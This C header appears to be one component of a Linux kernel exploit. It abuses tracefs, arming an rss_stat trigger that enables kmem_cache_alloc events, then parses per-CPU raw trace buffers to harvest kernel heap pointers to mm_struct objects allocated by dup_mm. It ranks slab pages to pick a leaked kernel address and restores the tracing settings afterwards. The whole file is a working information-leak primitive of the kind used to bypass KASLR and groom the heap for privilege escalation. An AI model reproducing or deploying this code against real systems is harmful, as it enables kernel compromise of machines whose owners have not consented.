#ifndef TRACEFS_MM_H
#define TRACEFS_MM_H

/* mm_struct address from dup_mm's kmem_cache_alloc record. */

#ifndef SLIDE_TRACEFS_MM_OBJECT
#define SLIDE_TRACEFS_MM_OBJECT 0x400ULL
#endif
#ifndef SLIDE_TRACEFS_MM_SITE_OFF
#error "tracefs mm leak needs the target's dup_mm call site offset"
#endif
#ifndef SLIDE_TRACEFS_MM_CAPTURE_KB
#define SLIDE_TRACEFS_MM_CAPTURE_KB 4096
#endif
#ifndef SLIDE_TRACEFS_MM_MIN_PAGE_OBJECTS
#define SLIDE_TRACEFS_MM_MIN_PAGE_OBJECTS 8
#endif
#ifndef SLIDE_TRACEFS_MM_PAGE_SIZE
#define SLIDE_TRACEFS_MM_PAGE_SIZE 0x8000ULL
#endif
#define TRACEFS_MM_MAX_PTRS 4096
#define TRACEFS_MM_SCAN_PAGES 64

static struct {
  int armed;
  uint32_t old_tracing;
  uint32_t old_buffer;
  pid_t tid;
  size_t count;
  unsigned int records;
} tracefs_mm_state;

static uintptr_t tracefs_mm_ptrs[TRACEFS_MM_MAX_PTRS];

static int tracefs_mm_write(const char *path, const char *value) {
  int fd = open(path, O_WRONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  size_t length = strlen(value);
  size_t done = 0;
  while (done < length) {
    ssize_t wrote = write(fd, value + done, length - done);
    if (wrote < 0 && errno == EINTR) {
      continue;
    }
    if (wrote <= 0) {
      close(fd);
      return 0;
    }
    done += (size_t)wrote;
  }
  return close(fd) == 0;
}

static int tracefs_mm_read_u32(const char *path, uint32_t *value) {
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  char text[32];
  ssize_t got;
  do {
    got = read(fd, text, sizeof(text) - 1);
  } while (got < 0 && errno == EINTR);
  close(fd);
  if (got <= 0) {
    return 0;
  }
  text[got] = 0;
  char *end = NULL;
  errno = 0;
  unsigned long parsed = strtoul(text, &end, 10);
  while (end && (*end == ' ' || *end == '\t' || *end == '\r' ||
                 *end == '\n')) {
    end++;
  }
  if (errno || end == text || parsed > UINT32_MAX ||
      (*end && strncmp(end, "(expanded:", 10) != 0)) {
    return 0;
  }
  *value = (uint32_t)parsed;
  return 1;
}

static void tracefs_mm_scan_page(const unsigned char *page, size_t length) {
  if (length < 16) {
    return;
  }
  uint64_t commit = 0;
  memcpy(&commit, page + 8, sizeof(commit));
  size_t end = 16 + (size_t)(commit & 0xfffULL);
  if (end > length) {
    end = length;
  }
  size_t pos = 16;
  while (pos + 4 <= end) {
    uint32_t header = 0;
    memcpy(&header, page + pos, sizeof(header));
    uint32_t type_len = header & 0x1fU;
    size_t record;
    size_t record_len;
    size_t total;
    if (type_len == 30) {
      pos += 8;
      continue;
    }
    if (type_len == 31) {
      pos += 12;
      continue;
    }
    if (type_len == 0) {
      uint32_t extended = 0;
      if (pos + 8 > end) {
        break;
      }
      memcpy(&extended, page + pos + 4, sizeof(extended));
      if (extended < 4) {
        break;
      }
      record = pos + 8;
      record_len = (size_t)extended - 4;
      total = 4 + (size_t)extended;
    } else if (type_len <= 28) {
      record = pos + 4;
      record_len = (size_t)type_len * 4;
      total = 4 + record_len;
    } else {
      break;
    }
    if (record + record_len > end || pos + total > end) {
      break;
    }
    tracefs_mm_state.records++;

    const unsigned char *entry = page + record;
    int pid = 0;
    memcpy(&pid, entry + 4, sizeof(pid));
    const unsigned char *payload = entry + 8;
    size_t payload_len = record_len >= 8 ? record_len - 8 : 0;
    if (pid == (int)tracefs_mm_state.tid && payload_len >= 32 &&
        tracefs_mm_state.count < TRACEFS_MM_MAX_PTRS) {
      uint64_t site = 0, pointer = 0, allocated = 0;
      memcpy(&site, payload, sizeof(site));
      memcpy(&pointer, payload + 8, sizeof(pointer));
      memcpy(&allocated, payload + 24, sizeof(allocated));
      if ((site & 0xffffULL) == (SLIDE_TRACEFS_MM_SITE_OFF & 0xffffULL) &&
          allocated == SLIDE_TRACEFS_MM_OBJECT &&
          (pointer >> 48) == 0xffffULL) {
        tracefs_mm_ptrs[tracefs_mm_state.count++] = (uintptr_t)pointer;
      }
    }
    pos += total;
  }
}

static void tracefs_mm_drain(void) {
  if (!tracefs_mm_state.armed) {
    return;
  }
  long cpu_count = sysconf(_SC_NPROCESSORS_CONF);
  if (cpu_count <= 0 || cpu_count > 256) {
    return;
  }
  unsigned char *page = malloc(PAGE_SIZE);
  if (!page) {
    return;
  }
  for (long cpu = 0; cpu < cpu_count; cpu++) {
    char path[128];
    snprintf(path, sizeof(path), "/sys/kernel/tracing/per_cpu/cpu%ld/"
                                 "trace_pipe_raw", cpu);
    int fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
    if (fd < 0) {
      continue;
    }
    for (unsigned int n = 0; n < TRACEFS_MM_SCAN_PAGES; n++) {
      ssize_t got = read(fd, page, PAGE_SIZE);
      if (got < 0 && errno == EINTR) {
        continue;
      }
      if (got <= 0) {
        break;
      }
      tracefs_mm_scan_page(page, (size_t)got);
    }
    close(fd);
  }
  free(page);
}

static int tracefs_mm_start(void) {
  char tracing_path[128];
  char buffer_path[128];
  char trace_path[128];
  char trigger_path[128];
  char text[16];

  memset(&tracefs_mm_state, 0, sizeof(tracefs_mm_state));
  snprintf(tracing_path, sizeof(tracing_path), "/sys/kernel/tracing/tracing_on");
  snprintf(buffer_path, sizeof(buffer_path),
           "/sys/kernel/tracing/buffer_size_kb");
  snprintf(trace_path, sizeof(trace_path), "/sys/kernel/tracing/trace");
  snprintf(trigger_path, sizeof(trigger_path),
           "/sys/kernel/tracing/events/kmem/rss_stat/trigger");

  if (!tracefs_mm_read_u32(tracing_path, &tracefs_mm_state.old_tracing) ||
      !tracefs_mm_read_u32(buffer_path, &tracefs_mm_state.old_buffer)) {
    pr_warning("mm trace unavailable errno=%d\n", errno);
    return 0;
  }
  tracefs_mm_write(tracing_path, "0");
  int fd = open(trace_path, O_WRONLY | O_TRUNC | O_CLOEXEC);
  if (fd >= 0) {
    close(fd);
  }
  snprintf(text, sizeof(text), "%d\n", (int)SLIDE_TRACEFS_MM_CAPTURE_KB);
  tracefs_mm_write(buffer_path, text);
  tracefs_mm_write(tracing_path, "1");
  /* Events enabled before the first tracing_on=1 stay inactive for the burst. */
  tracefs_mm_state.armed =
      tracefs_mm_write(trigger_path, "enable_event:kmem:kmem_cache_alloc\n");
  tracefs_mm_state.tid = (pid_t)syscall(SYS_gettid);
  if (!tracefs_mm_state.armed) {
    pr_warning("mm trace trigger denied errno=%d\n", errno);
    snprintf(text, sizeof(text), "%u\n", tracefs_mm_state.old_buffer);
    tracefs_mm_write(buffer_path, text);
    snprintf(text, sizeof(text), "%u\n", tracefs_mm_state.old_tracing);
    tracefs_mm_write(tracing_path, text);
    return 0;
  }
  return 1;
}

static int tracefs_mm_finish(uintptr_t *leaked, size_t min_index,
                             size_t max_index) {
  if (!tracefs_mm_state.armed) {
    return 0;
  }
  tracefs_mm_write("/sys/kernel/tracing/tracing_on", "0");
  tracefs_mm_drain();

  uintptr_t best_base = 0;
  size_t best_objects = 0;
  size_t best_index = 0;
  /* Prefer pages with an object in the index window, then the densest. */
  long best_rank = -1;
  for (size_t i = 0; i < tracefs_mm_state.count; i++) {
    uintptr_t base = tracefs_mm_ptrs[i] & ~(SLIDE_TRACEFS_MM_PAGE_SIZE - 1);
    size_t objects = 0;
    int covers = 0;
    for (size_t j = 0; j < tracefs_mm_state.count; j++) {
      if ((tracefs_mm_ptrs[j] & ~(SLIDE_TRACEFS_MM_PAGE_SIZE - 1)) != base) {
        continue;
      }
      objects++;
      size_t index =
          (size_t)((tracefs_mm_ptrs[j] & (SLIDE_TRACEFS_MM_PAGE_SIZE - 1)) /
                   SLIDE_TRACEFS_MM_OBJECT);
      if (index >= min_index && index <= max_index) {
        covers = 1;
      }
    }
    long rank = (covers ? 1000000L : 0L) + (long)objects;
    if (rank > best_rank) {
      best_rank = rank;
      best_objects = objects;
      best_base = base;
    }
  }
  int found = 0;
  if (best_base && best_objects >= SLIDE_TRACEFS_MM_MIN_PAGE_OBJECTS) {
    for (size_t i = 0; i < tracefs_mm_state.count; i++) {
      if ((tracefs_mm_ptrs[i] & ~(SLIDE_TRACEFS_MM_PAGE_SIZE - 1)) !=
          best_base) {
        continue;
      }
      size_t index =
          (size_t)((tracefs_mm_ptrs[i] & (SLIDE_TRACEFS_MM_PAGE_SIZE - 1)) /
                   SLIDE_TRACEFS_MM_OBJECT);
      if (index < min_index || index > max_index) {
        continue;
      }
      best_index = index;
      *leaked = best_base + index * SLIDE_TRACEFS_MM_OBJECT;
      found = 1;
      break;
    }
  }
  pr_info("mm trace page=%016zx objects=%zu index=%zu found=%d hits=%zu "
          "records=%u\n", best_base, best_objects, best_index, found,
          tracefs_mm_state.count, tracefs_mm_state.records);

  char text[64];
  snprintf(text, sizeof(text), "!enable_event:kmem:kmem_cache_alloc\n");
  tracefs_mm_write("/sys/kernel/tracing/events/kmem/rss_stat/trigger", text);
  snprintf(text, sizeof(text), "%u\n", tracefs_mm_state.old_buffer);
  tracefs_mm_write("/sys/kernel/tracing/buffer_size_kb", text);
  snprintf(text, sizeof(text), "%u\n", tracefs_mm_state.old_tracing);
  tracefs_mm_write("/sys/kernel/tracing/tracing_on", text);
  tracefs_mm_state.armed = 0;
  return found;
}

#endif
